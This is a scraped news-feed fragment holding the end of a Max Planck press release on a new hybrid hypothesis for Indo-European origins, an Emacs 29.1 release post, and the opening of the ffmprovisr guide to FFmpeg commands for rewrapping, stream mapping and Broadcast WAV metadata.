/20667325/original-1690297060.webp?t=eyJ3aWR0aCI6MzIwLCJmaWxlX2V4dGVuc2lvbiI6IndlYnAiLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--67fdc411cfb51174ff935a98c60a0cb9153f3156 320w, /20667325/original-1690297060.webp?t=eyJ3aWR0aCI6NDExLCJmaWxlX2V4dGVuc2lvbiI6IndlYnAiLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--6412f895379ad2fb2db6c5d8d15be02147174867 411w, /20667325/original-1690297060.webp?t=eyJ3aWR0aCI6NDgwLCJmaWxlX2V4dGVuc2lvbiI6IndlYnAiLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--581031a026ed8b6c97ad06df5bbbccadee09522a 480w, /20667325/original-1690297060.webp?t=eyJ3aWR0aCI6MzYwLCJmaWxlX2V4dGVuc2lvbiI6IndlYnAiLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--4e3a2b460fe9d1923dad3f0a53296c13ae0f7b43 360w, /20667325/original-1690297060.webp?t=eyJ3aWR0aCI6ODI4LCJmaWxlX2V4dGVuc2lvbiI6IndlYnAiLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--6abb83f5b0f6f4e1b5ce9e6a24ab71b519d165b2 828w, /20667325/original-1690297060.webp?t=eyJ3aWR0aCI6NzUwLCJmaWxlX2V4dGVuc2lvbiI6IndlYnAiLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--9896a242a63dd7cec7a3b70f9b94bb355b21033b 750w, /20667325/original-1690297060.webp?t=eyJ3aWR0aCI6NjQwLCJmaWxlX2V4dGVuc2lvbiI6IndlYnAiLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--ab625ea9da349dbdf94c1be297f78baf31150123 640w, /20667325/original-1690297060.webp?t=eyJ3aWR0aCI6ODIyLCJmaWxlX2V4dGVuc2lvbiI6IndlYnAiLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--51b01d26c5550109b7a4beb86f868a12f88ec6fe 822w, /20667325/original-1690297060.webp?t=eyJ3aWR0aCI6OTYwLCJmaWxlX2V4dGVuc2lvbiI6IndlYnAiLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--b9ddd03cf848d6df3eea7090efdac1da5bd6c98b 960w, /20667325/original-1690297060.webp?t=eyJ3aWR0aCI6NzIwLCJmaWxlX2V4dGVuc2lvbiI6IndlYnAiLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--c5cd9de937ea7f11f75a1dc948ced6f7b803f37c 720w" sizes="100vw" type="image/webp" /><source media="(max-width: 767px)" srcset="/20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6NDE0LCJmaWxlX2V4dGVuc2lvbiI6ImpwZyIsIm9ial9pZCI6MjA2NjczMjV9--4d112561c8d197b15a12922eb97525e821be1a9d 414w, /20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6Mzc1LCJmaWxlX2V4dGVuc2lvbiI6ImpwZyIsIm9ial9pZCI6MjA2NjczMjV9--b5ec5cda0a5edcc4d7795b6bbaa6d950d2e3bbd2 375w, /20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6MzIwLCJmaWxlX2V4dGVuc2lvbiI6ImpwZyIsIm9ial9pZCI6MjA2NjczMjV9--1522bde8d9b032360c0e5f80b804b84bbcb564d4 320w, /20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6NDExLCJmaWxlX2V4dGVuc2lvbiI6ImpwZyIsIm9ial9pZCI6MjA2NjczMjV9--03bf28f91403f6744b824be9bf9c7fa356dcd0fc 411w, /20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6NDgwLCJmaWxlX2V4dGVuc2lvbiI6ImpwZyIsIm9ial9pZCI6MjA2NjczMjV9--d970bb12a83d3092bd50144eefa905fae76a9095 480w, /20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6MzYwLCJmaWxlX2V4dGVuc2lvbiI6ImpwZyIsIm9ial9pZCI6MjA2NjczMjV9--58499507f157b124137ab57fd662ae0a3c24b579 360w, /20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6ODI4LCJmaWxlX2V4dGVuc2lvbiI6ImpwZyIsIm9ial9pZCI6MjA2NjczMjV9--ae63a14884d3ad97c92f97eac48315a84662ea99 828w, /20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6NzUwLCJmaWxlX2V4dGVuc2lvbiI6ImpwZyIsIm9ial9pZCI6MjA2NjczMjV9--8a24e92a5e70a710a97ef2e432212a86c4dd488e 750w, /20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6NjQwLCJmaWxlX2V4dGVuc2lvbiI6ImpwZyIsIm9ial9pZCI6MjA2NjczMjV9--5225ab33a56f2769c3f351d9b8ea3e281db93224 640w, /20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6ODIyLCJmaWxlX2V4dGVuc2lvbiI6ImpwZyIsIm9ial9pZCI6MjA2NjczMjV9--007a3706ff0090932c500367126841f6d8e0e10e 822w, /20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6OTYwLCJmaWxlX2V4dGVuc2lvbiI6ImpwZyIsIm9ial9pZCI6MjA2NjczMjV9--7ff94056bf83a1a9fc9414a688e8575e98ea7eee 960w, /20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6NzIwLCJmaWxlX2V4dGVuc2lvbiI6ImpwZyIsIm9ial9pZCI6MjA2NjczMjV9--8f1e67194eee41de39d67fd1ea652898fb781132 720w" sizes="100vw" type="image/jpeg" /><source media="(min-width: 768px) and (max-width: 991px)" srcset="/20667325/original-1690297060.webp?t=eyJ3aWR0aCI6OTAwLCJmaWxlX2V4dGVuc2lvbiI6IndlYnAiLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--579fb3fb3febb0cf7387f34cd7f99e2ed8ed4312 900w, /20667325/original-1690297060.webp?t=eyJ3aWR0aCI6MTgwMCwiZmlsZV9leHRlbnNpb24iOiJ3ZWJwIiwib2JqX2lkIjoyMDY2NzMyNX0%3D--ffbfa9ea72be1e7e40281e24bcf3e13d3e550899 1800w" sizes="900px" type="image/webp" /><source media="(min-width: 768px) and (max-width: 991px)" srcset="/20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6OTAwLCJmaWxlX2V4dGVuc2lvbiI6ImpwZyIsIm9ial9pZCI6MjA2NjczMjV9--3451763374b584702a6027d7517f874fd781bd31 900w, /20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6MTgwMCwiZmlsZV9leHRlbnNpb24iOiJqcGciLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--c786a6de7d1b625b6fda3b2eac76ce16f75a582f 1800w" sizes="900px" type="image/jpeg" /><source media="(min-width: 992px) and (max-width: 1199px)" srcset="/20667325/original-1690297060.webp?t=eyJ3aWR0aCI6MTIwMCwiZmlsZV9leHRlbnNpb24iOiJ3ZWJwIiwicXVhbGl0eSI6ODYsIm9ial9pZCI6MjA2NjczMjV9--46e055c2eacbf2fdff98be1a8f41bb5dc40f314d 1200w, /20667325/original-1690297060.webp?t=eyJ3aWR0aCI6MjQwMCwiZmlsZV9leHRlbnNpb24iOiJ3ZWJwIiwib2JqX2lkIjoyMDY2NzMyNX0%3D--5a8cdb718d73b073cc98ab562be645f67fd1fb1a 2400w" sizes="1200px" type="image/webp" /><source media="(min-width: 992px) and (max-width: 1199px)" srcset="/20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6MTIwMCwiZmlsZV9leHRlbnNpb24iOiJqcGciLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--6ad579df03a590bb268bf07c515b1451435ab827 1200w, /20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6MjQwMCwiZmlsZV9leHRlbnNpb24iOiJqcGciLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--f72d84bb1388f2e13a03a47498350c3c2b865cbb 2400w" sizes="1200px" type="image/jpeg" /><source media="(min-width: 1200px)" srcset="/20667325/original-1690297060.webp?t=eyJ3aWR0aCI6MTQwMCwiZmlsZV9leHRlbnNpb24iOiJ3ZWJwIiwicXVhbGl0eSI6ODYsIm9ial9pZCI6MjA2NjczMjV9--73b2428ab32a7a43088577907538ec76f9c5e4af 1400w, /20667325/original-1690297060.webp?t=eyJ3aWR0aCI6MjgwMCwiZmlsZV9leHRlbnNpb24iOiJ3ZWJwIiwib2JqX2lkIjoyMDY2NzMyNX0%3D--7b4a68f127b0e33d887c6cedd2d275fc75bd639e 2800w" sizes="1400px" type="image/webp" /><source media="(min-width: 1200px)" srcset="/20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6MTQwMCwiZmlsZV9leHRlbnNpb24iOiJqcGciLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--dd8ea4ce53e785c11ff182e1b16e60204a1c3e1d 1400w, /20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6MjgwMCwiZmlsZV9leHRlbnNpb24iOiJqcGciLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--0266dfde40a67099b7270dffaf277376497f591a 2800w" sizes="1400px" type="image/jpeg" /><img alt="A hybrid hypothesis for the origin and spread of the Indo-European languages. The language family began to diverge from around 8100 years ago, out of a homeland immediately south of the Caucasus. One migration reached the Pontic-Caspian and Forest Steppe around 7000 years ago, and from there subsequent migrations spread into parts of Europe around 5000 years ago." class="" title="A hybrid hypothesis for the origin and spread of the Indo-European languages. The language family began to diverge from around 8100 years ago, out of a homeland immediately south of the Caucasus. One migration reached the Pontic-Caspian and Forest Steppe around 7000 years ago, and from there subsequent migrations spread into parts of Europe around 5000 years ago." src="/20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6MTQwMCwiZmlsZV9leHRlbnNpb24iOiJqcGciLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--dd8ea4ce53e785c11ff182e1b16e60204a1c3e1d" /></picture>">
      
      

    
</figure>

<p>For over two hundred years, the origin of the Indo-European languages has been disputed. Two main theories have recently dominated this debate: the ‘Steppe’ hypothesis, which proposes an origin in the Pontic-Caspian Steppe around 6000 years ago, and the ‘Anatolian’ or ‘farming’ hypothesis, suggesting an older origin tied to early agriculture around 9000 years ago. Previous phylogenetic analyses of Indo-European languages have come to conflicting conclusions about the age of the family, due to the combined effects of inaccuracies and inconsistencies in the datasets they used and limitations in the way that phylogenetic methods analyzed ancient languages.</p><p>To solve these problems, researchers from the Department of Linguistic and Cultural Evolution at the Max Planck Institute for Evolutionary Anthropology assembled an international team of over 80 language specialists to construct a new dataset of core vocabulary from 161 Indo-European languages, including 52 ancient or historical languages. This more comprehensive and balanced sampling, combined with rigorous protocols for coding lexical data, rectified the problems in the datasets used by previous studies.</p><h2>Indo-European estimated to be around 8100 years old</h2><p>The team used recently developed ancestry-enabled Bayesian phylogenetic analysis to test whether ancient written languages, such as Classical Latin and Vedic Sanskrit, were the direct ancestors of modern Romance and Indic languages, respectively. Russell Gray, Head of the Department of Linguistic and Cultural Evolution and senior author of the study, emphasized the care they had taken to ensure that their inferences were robust. “Our chronology is robust across a wide range of alternative phylogenetic models and sensitivity analyses”, he stated. These analyses estimate the Indo-European family to be approximately 8100 years old, with five main branches already split off by around 7000 years ago.</p><p>These results are not entirely consistent with either the Steppe or the farming hypotheses. The first author of the study, Paul Heggarty, observed that “Recent ancient DNA data suggest that the Anatolian branch of Indo-European did not emerge from the Steppe, but from further south, in or near the northern arc of the Fertile Crescent — as the earliest source of the Indo-European family. Our language family tree topology, and our lineage split dates, point to other early branches that may also have spread directly from there, not through the Steppe.”</p><h2>New insights from genetics and linguistics</h2><p>The authors of the study therefore proposed a new hybrid hypothesis for the origin of the Indo-European languages, with an ultimate homeland south of the Caucasus and a subsequent branch northwards onto the Steppe, as a secondary homeland for some branches of Indo-European entering Europe with the later Yamnaya and Corded Ware-associated expansions. “Ancient DNA and language phylogenetics thus combine to suggest that the resolution to the 200-year-old Indo-European enigma lies in a hybrid of the farming and Steppe hypotheses”, remarked Gray.</p><p>Wolfgang Haak, a Group Leader in the Department of Archaeogenetics at the Max Planck Institute for Evolutionary Anthropology, summarizes the implications of the new study by stating, “Aside from a refined time estimate for the overall language tree, the tree topology and branching order are most critical for the alignment with key archaeological events and shifting ancestry patterns seen in the ancient human genome data. This is a huge step forward from the mutually exclusive, previous scenarios, towards a more plausible model that integrates archaeological, anthropological and genetic findings.”</p>
  
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Emacs 29.1 Released (335 pts)]]></title>
            <link>https://emacsredux.com/blog/2023/07/30/emacs-29-1-released/</link>
            <guid>36929514</guid>
            <pubDate>Sun, 30 Jul 2023 09:47:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://emacsredux.com/blog/2023/07/30/emacs-29-1-released/">https://emacsredux.com/blog/2023/07/30/emacs-29-1-released/</a>, See on <a href="https://news.ycombinator.com/item?id=36929514">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody">
        <p>Today is a great day for Emacs - Emacs 29.1 has just been released<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" rel="footnote">1</a></sup>!
Every Emacs release is special, but I haven’t been so excited about a new version of Emacs
in ages. Why so?</p>

<p><strong>Reason #1</strong> - <a href="https://batsov.com/articles/2021/12/06/emacs-is-not-a-proper-gtk-application/">pure GTK
front-end</a>
(a.k.a. <code>pgtk</code>). This also means that now Emacs supports natively Wayland. Which in tern means that it’s easier than ever to run <a href="https://emacsredux.com/blog/2021/12/19/using-emacs-on-windows-11-with-wsl2/">Emacs in Windows’s WSL</a>. This is huge!</p>

<p><strong>Reason #2</strong> - built-in support for the massively popular <a href="https://microsoft.github.io/language-server-protocol/">Language Server Protocol</a> via <a href="https://github.com/joaotavora/eglot">eglot</a>. <code>eglot</code> has existed for a while, but it’s nice
to see it bundled with Emacs going forward. This will certainly make Emacs better positioned to complete with “modern” editors like VS Code.</p>

<p><strong>Reason #3</strong> - built-in support for
<a href="https://tree-sitter.github.io/tree-sitter/">TreeSitter</a>. This means that a few
years down the road we’ll have many Emacs major modes that are much faster, robust
and feature-rich. It’s infinitely easier to built a major mode using a real
parser instead of using regular expressions.  Lots of built-in modes have
already been updated to have a version using <code>TreeSitter</code> internally. Frankly, I
can’t think of a bigger improvement in Emacs in the almost 20 years I’ve been an
Emacs user. Exciting times ahead!</p>

<p>You can read all about the new release <a href="https://github.com/emacs-mirror/emacs/blob/master/etc/NEWS.29">here</a>. I’ll likely write a few articles about some of the new features in the weeks and months to come. In Emacs We Trust! M-x Forever!</p>

<p><strong>P.S.</strong> Feel free to share in the comments what are you most excited about.</p>



    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Ffmprovisr – Making FFmpeg Easier (353 pts)]]></title>
            <link>https://amiaopensource.github.io/ffmprovisr/</link>
            <guid>36929499</guid>
            <pubDate>Sun, 30 Jul 2023 09:44:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://amiaopensource.github.io/ffmprovisr/">https://amiaopensource.github.io/ffmprovisr/</a>, See on <a href="https://news.ycombinator.com/item?id=36929499">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <div>
      <h2 id="about">About ffmprovisr</h2>
      <h3>Making FFmpeg Easier</h3>
      <p>FFmpeg is a powerful tool for manipulating audiovisual files. Unfortunately, it also has a steep learning curve, especially for users unfamiliar with a command line interface. This app helps users through the command generation process so that more people can reap the benefits of FFmpeg.</p>
      <p>Each button displays helpful information about how to perform a wide variety of tasks using FFmpeg. To use this site, click on the task you would like to perform. A new window will open up with a sample command and a description of how that command works. You can copy this command and understand how the command works with a breakdown of each of the flags.</p>
      <p>This page does not have search functionality, but you can open all recipes (second option in the sidebar) and use your browser's search tool (often ctrl+f or cmd+f) to perform a keyword search through all recipes.</p>
      <h3>Tutorials</h3>
      <p>For FFmpeg basics, check out the program’s <a href="https://ffmpeg.org/" target="_blank">official website</a>.</p>
      <p>For instructions on how to install FFmpeg on Mac, Linux, and Windows, refer to Reto Kromer’s <a href="https://avpres.net/FFmpeg/#ch1" target="_blank">installation instructions</a>.</p>
      <p>For Bash and command line basics, try the <a href="https://learnpythonthehardway.org/book/appendixa.html" target="_blank">Command Line Crash Course</a>. For a little more context presented in an ffmprovisr style, try <a href="https://explainshell.com/" target="_blank">explainshell.com</a>!</p>
      <h3>License</h3>
      <p>
        <a href="https://creativecommons.org/licenses/by/4.0/" target="_blank"><img alt="Creative Commons License" src="https://amiaopensource.github.io/ffmprovisr/img/cc.png"></a><br>
        This work is licensed under a <a href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.
      </p>
      <h3>Sibling projects</h3>
      <p><a href="https://dd388.github.io/crals/" target="_blank">Script Ahoy</a>: Community Resource for Archivists and Librarians Scripting</p>
      <p><a href="https://datapraxis.github.io/sourcecaster/" target="_blank">The Sourcecaster</a>: an app that helps you use the command line to work through common challenges that come up when working with digital primary sources.</p>
      <p><a href="https://pugetsoundandvision.github.io/micropops/" target="_blank">Micropops</a>: One liners and automation tools from Moving Image Preservation of Puget Sound</p>
      <p><a href="https://amiaopensource.github.io/cable-bible/" target="_blank">Cable Bible</a>: A Guide to Cables and Connectors Used for Audiovisual Tech</p>
      <p><a href="https://eaasi.gitlab.io/program_docs/qemu-qed/" target="_blank">QEMU QED</a>: instructions for using QEMU (Quick EMUlator), a command line application for computer emulation and virtualization</p>
      <p><a href="https://amiaopensource.github.io/ffmpeg-artschool/" target="_blank">ffmpeg-artschool</a>: An AMIA workshop featuring scripts, exercises, and activities to make art using FFmpeg</p>
    </div>

    <div>
    <h2 id="basics">Learn about FFmpeg basics</h2>
      <!-- Basic structure of an FFmpeg command -->
      <p><label for="basic-structure">Basic structure of an FFmpeg command</label>
      </p><div>
        <h5>Basic structure of an FFmpeg command</h5>
        <p>At its basis, an FFmpeg command is relatively simple. After you have installed FFmpeg (see instructions <a href="https://avpres.net/FFmpeg/#ch1" target="_blank">here</a>), the program is invoked simply by typing <code>ffmpeg</code> at the command prompt.</p>
        <p>Subsequently, each instruction that you supply to FFmpeg is actually a pair: a flag, which designates the <em>type</em> of action you want to carry out; and then the specifics of that action. Flags are always prepended with a hyphen.</p>
        <p>For example, in the instruction <code>-i <em>input_file.ext</em></code>, the <code>-i</code> flag tells FFmpeg that you are supplying an input file, and <code>input_file.ext</code> states which file it is.</p>
        <p>Likewise, in the instruction <code>-c:v prores</code>, the flag <code>-c:v</code> tells FFmpeg that you want to encode the video stream, and <code>prores</code> specifies which codec is to be used. (<code>-c:v</code> is shorthand for <code>-codec:v</code>/<code>-codec:video</code>).</p>
        <p>A very basic FFmpeg command looks like this:</p>
        <dl>
          <dt>ffmpeg</dt><dd>starts the command</dd>
          <dt>-i <em>input_file.ext</em></dt><dd>path and name of the input file</dd>
          <dt><em>-flag some_action</em></dt><dd>tell FFmpeg to do something, by supplying a valid flag and action</dd>
          <dt><em>output_file.ext</em></dt><dd>path and name of the output file.<br>
            Because this is the last part of the command, the filename you type here does not have a flag designating it as the output file.</dd>
        </dl>
        
      </div>
      <!-- End Basic structure of an FFmpeg command -->

      <!-- Streaming vs. Saving -->
      <p><label for="streaming-saving">Streaming vs. Saving</label>
      </p><div>
        <h5>Streaming vs. Saving</h5>
        <p>FFplay allows you to stream created video and FFmpeg allows you to save video.</p>
        <p>The following command creates and saves a 10-second video of SMPTE bars:</p>
        <p><code>ffmpeg -f lavfi -i smptebars=size=640x480 -t 5 output_file</code></p>
        <p>This command plays and streams SMPTE bars but does not save them on the computer:</p>
        <p><code>ffplay -f lavfi smptebars=size=640x480</code></p>
        <p>The main difference is small but significant: the <code>-i</code> flag is required for FFmpeg but not required for FFplay. Additionally, the FFmpeg script needs to have <code>-t 5</code> and <code>output.mkv</code> added to specify the length of time to record and the place to save the video.</p>
        
      </div>
      <!-- End Streaming vs. Saving -->
    </div>
    <div>

    <h2 id="concepts">Learn about more advanced FFmpeg concepts</h2>
    <!-- Loop usage explanation -->
    <p><label for="batch-loop">Batch and Loop script usage</label>
    </p><div>
      <h5>Batch and Loop script usage</h5>
      <p><code>ffmpeg -nostdin -i <em>input_file</em> ...</code></p>
      <p>One of the frequent uses of FFmpeg is to run batch commands within loops to, for example, generate access files for an entire collection at once.</p>
      <p>When running an FFmpeg command within a loop it is often necessary to use the <code>-nostdin</code> flag prior to the input in order to ensure successful execution of the commands. This is needed to override FFmpeg's default behavior of enabling interaction on standard input which can result in errors as loop inputs are fed to the ongoing command.</p>
      
    </div>
    <!-- End loop usage explanation -->

    <!-- Codec Defaults explanation -->
    <p><label for="codec-defaults">Codec defaults</label>
    </p><div>
      <h5>Codec Defaults</h5>
      <p>Unless specified, FFmpeg will automatically set codec choices and codec parameters based off of internal defaults. These defaults are applied based on the file type used in the output (for example <code>.mov</code> or <code>.wav</code>).</p>
      <p>When creating or transcoding files with FFmpeg, it is important to consider codec settings for both audio and video, as the default options may not be desirable in your particular context. The following is a brief list of codec defaults for some common file types:</p>
      <ul>
        <li><code>.avi</code>: Audio Codec: mp3, Video Codec: mpeg4</li>
        <li><code>.mkv</code>: Audio Codec: ac3, Video Codec: H.264</li>
        <li><code>.mov</code>: Audio Codec: AAC, Video Codec: H.264</li>
        <li><code>.mp4</code>: Audio Codec: AAC, Video Codec: H.264</li>
        <li><code>.mpg</code>: Audio Codec: mp2, Video Codec: mpeg1video</li>
        <li><code>.mxf</code>: Audio Codec: pcm_s16le, Video Codec: mpeg2video</li>
        <li><code>.wav</code>: Audio Codec: pcm_s16le (16 bit PCM)</li>
      </ul>
      
    </div>
    <!-- End Codec Defaults -->

    <!-- Filtergraph explanation -->
    <p><label for="filtergraphs">Filtergraphs</label>
    </p><div>
      <h5>Filtergraphs</h5>
      <p>Many FFmpeg commands use filters that manipulate the video or audio stream in some way: for example, <a href="https://ffmpeg.org/ffmpeg-filters.html#hflip" target="_blank">hflip</a> to horizontally flip a video, or <a href="https://ffmpeg.org/ffmpeg-filters.html#amerge-1" target="_blank">amerge</a> to merge two or more audio tracks into a single stream.</p>
      <p>The use of a filter is signaled by the flag <code>-vf</code> (video filter) or <code>-af</code> (audio filter), followed by the name and options of the filter itself. For example, take the <a href="#convert-colorspace">convert colorspace</a> command:</p>
      <p><code>ffmpeg -i <em>input_file</em> -c:v libx264 -vf colormatrix=<em>src</em>:<em>dst</em> <em>output_file</em></code>
      </p><p>Here, <a href="https://ffmpeg.org/ffmpeg-filters.html#colormatrix" target="_blank">colormatrix</a> is the filter used, with <em>src</em> and <em>dst</em> representing the source and destination colorspaces. This part following the <code>-vf</code> is a <strong>filtergraph</strong>.</p>
      <p>It is also possible to apply multiple filters to an input, which are sequenced together in the filtergraph. A chained set of filters is called a filter chain, and a filtergraph may include multiple filter chains. Filters in a filterchain are separated from each other by commas (<code>,</code>), and filterchains are separated from each other by semicolons (<code>;</code>). For example, take the <a href="#inverse-telecine">inverse telecine</a> command:</p>
      <p><code>ffmpeg -i <em>input_file</em> -c:v libx264 -vf "fieldmatch,yadif,decimate" <em>output_file</em></code></p>
      <p>Here we have a filtergraph including one filter chain, which is made up of three video filters.</p>
      <p>It is often prudent to enclose your filtergraph in quotation marks; this means that you can use spaces within the filtergraph. Using the inverse telecine example again, the following filter commands are all valid and equivalent:</p>
      <ul>
        <li><code>-vf fieldmatch,yadif,decimate</code></li>
        <li><code>-vf "fieldmatch,yadif,decimate"</code></li>
        <li><code>-vf "fieldmatch, yadif, decimate"</code></li>
      </ul>
      <p>but <code>-vf fieldmatch, yadif, decimate</code> is not valid.</p>
      <p>The ordering of the filters is significant. Video filters are applied in the order given, with the output of one filter being passed along as the input to the next filter in the chain. In the example above, <code>fieldmatch</code> reconstructs the original frames from the inverse telecined video, <code>yadif</code> deinterlaces (this is a failsafe in case any combed frames remain, for example if the source mixes telecined and real interlaced content), and <code>decimate</code> deletes duplicated frames. Clearly, it is not possible to delete duplicated frames before those frames are reconstructed.</p>
      <h4>Notes</h4>
      <ul>
        <li><code>-vf</code> is an alias for <code>-filter:v</code></li>
        <li>If the command involves more than one input or output, you must use the flag <code>-filter_complex</code> instead of <code>-vf</code>.</li>
        <li>Straight quotation marks ("like this") rather than curved quotation marks (“like this”) should be used.</li>
      </ul>
      <p>For more information, check out the FFmpeg wiki <a href="https://trac.ffmpeg.org/wiki/FilteringGuide" target="_blank">Filtering Guide</a>.</p>
      
    </div>
    <!-- End Filtergraph explanation -->

    <!-- Stream mapping explanation -->
    <p><label for="stream-mapping">Stream mapping</label>
    </p><div>
      <h5>Stream mapping</h5>
      <p>Stream mapping is the practice of defining which of the streams (e.g., video or audio tracks) present in an input file will be present in the output file. FFmpeg recognizes five stream types:</p>
      <ul>
        <li><code>a</code> - audio</li>
        <li><code>v</code> - video</li>
        <li><code>s</code> - subtitle</li>
        <li><code>d</code> - data (including timecode tracks)</li>
        <li><code>t</code> - attachment</li>
      </ul>
      <p>Mapping is achieved by use of the <code>-map</code> flag, followed by an action of the type <code>file_number:stream_type[:stream_number]</code>. Numbering is zero-indexed, and it's possible to map by stream type and/or overall stream order within the input file. For example:</p>
      <ul>
        <li><code>-map 0:v</code> means ‘take all video streams from the first input file’.</li>
        <li><code>-map 0:3</code> means ‘take the fourth stream from the first input file’.</li>
        <li><code>-map 0:a:2</code> means ‘take the third audio stream from the first input file’.</li>
        <li><code>-map 0:0 -map 0:2</code> means ‘take the first and third streams from the first input file’.</li>
        <li><code>-map 0:1 -map 1:0</code> means ‘take the second stream from the first input file and the first stream from the second input file’.</li>
      </ul>
      <p>When no mapping is specified in an ffmpeg command, the default for video files is to take just one video and one audio stream for the output: other stream types, such as timecode or subtitles, will not be copied to the output file by default. If multiple video or audio streams are present, the best quality one is automatically selected by FFmpeg.</p>
      <p>To map <em>all</em> streams in the input file to the output file, use <code>-map 0</code>. However, note that not all container formats can include all stream types: for example, .mp4 cannot contain timecode.</p>
      <h4>Mapping with a failsafe</h4>
      <p>To safely process files that may or may not contain given a type of stream, you can add a trailing <code>?</code> to your map commands: for example, <code>-map 0:a?</code> instead of <code>-map 0:a</code>.</p>
      <p>This makes the map optional: audio streams will be mapped over if they are present in the file—but if the file contains no audio streams, the transcode will proceed as usual, minus the audio stream mapping. Without adding the trailing <code>?</code>, FFmpeg will exit with an error on that file.</p>
      <p>This is especially recommended when batch processing video files: it ensures that all files in your batch will be transcoded, whether or not they contain audio streams.</p>
      <p>For more information, check out the FFmpeg wiki <a href="https://trac.ffmpeg.org/wiki/Map" target="_blank">Map</a> page, and the official FFmpeg <a href="https://ffmpeg.org/ffmpeg.html#Advanced-options" target="_blank">documentation on <code>-map</code></a>.</p>
      
    </div>
    <!-- End Stream Mapping explanation -->

    </div>
    <div>
    <h2 id="rewrap">Change container (rewrap)</h2>

    <!-- Basic rewrap command -->
    <p><label for="basic-rewrap">Basic rewrap command</label>
    </p><div>
      <h5>Rewrap a file</h5>
      <p><code>ffmpeg -i <em>input_file.ext</em> -c copy -map 0 <em>output_file.ext</em></code></p>
      <p>This script will rewrap a video file. It will create a new video video file where the inner content (the video, audio, and subtitle data) of the original file is unchanged, but these streams are rehoused within a different container format.</p>
      <p><strong>Note:</strong> rewrapping is also known as remuxing, short for re-multiplexing.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file.ext</em></dt><dd>path and name of the input file</dd>
        <dt>-c copy</dt><dd>copy the streams directly, without re-encoding.</dd>
        <dt>-map 0</dt><dd>map all streams of the input to the output.<br>
        By default, FFmpeg will only map one stream of each type (video, audio, subtitles) to the output file. However, files may have multiple streams of a given type - for example, a video may have several audio tracks for different languages. Therefore, if you want to preserve all the streams in the original, it's necessary to use this option.</dd>
        <dt><em>output_file.ext</em></dt><dd>path and name of the output file.<br>
        The new container you are rewrapping to is defined by the filename extension used here, e.g. .mkv, .mp4, .mov.</dd>
      </dl>
      <h4>Important caveat</h4>
      <p>It may not be possible to rewrap a file's contents to a new container without re-encoding one or more of the streams within (that is, the video, audio, and subtitle tracks). Some containers can only contain streams of a certain encoding type: for example, the .mp4 container does not support uncompressed audio tracks. (In practice .mp4 goes hand-in-hand with a H.264-encoded video stream and an AAC-encoded video stream, although other types of video and audio streams are possible). Another example is that the Matroska container does not allow data tracks; see the <a href="#mkv-to-mp4">MKV to MP4 recipe</a>.</p>
      <p>In such cases, FFmpeg will throw an error. If you encounter errors of this kind, you may wish to consult the <a href="#transcode">list of transcoding recipes</a>.</p>
      
    </div>
    <!-- End Basic rewrap command -->

    <!-- BWF -->
    <p><label for="bwf">Convert to (or create) Broadcast WAV</label>
    </p><div>
      <h5>Generate Broadcast WAV</h5>
      <p><code>ffmpeg -i <em>input_file.wav</em> -c copy -write_bext 1 -metadata field_name='Content' <em>output_file.wav</em></code></p>
      <p>This command will write a file in the Broadcast Wave Format (BWF) containing a BEXT chunk with related metadata.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file.wav</em></dt><dd>path and name of the input file</dd>
        <dt>-c copy</dt><dd>this will copy the encoding/sample rate etc from the input. If not using a WAV as the input file you will have to specify codec settings in place of this.</dd>
        <dt>-write_bext 1</dt><dd>tells FFmpeg to write a BEXT chunk, the part of the file where BWF metadata is stored.</dd>
        <dt>-metadata field_name='Content'</dt><dd>This is where you can specify which BEXT fields to write, and what information to fill them with by replacing <code>field_name</code> and <code>'Content'</code> respectively. See below for additional details.</dd>
      </dl>
      <p>Notes: You can choose which fields to write by repeating <code>-metadata field_name='Content'</code> for each desired field. Flags for commonly used fields (such as those recommended by the <a href="http://www.digitizationguidelines.gov/audio-visual/documents/Embed_Guideline_20120423.pdf">FADGI guidelines</a>) are as follows:</p>
      <ul>
        <li>description</li>
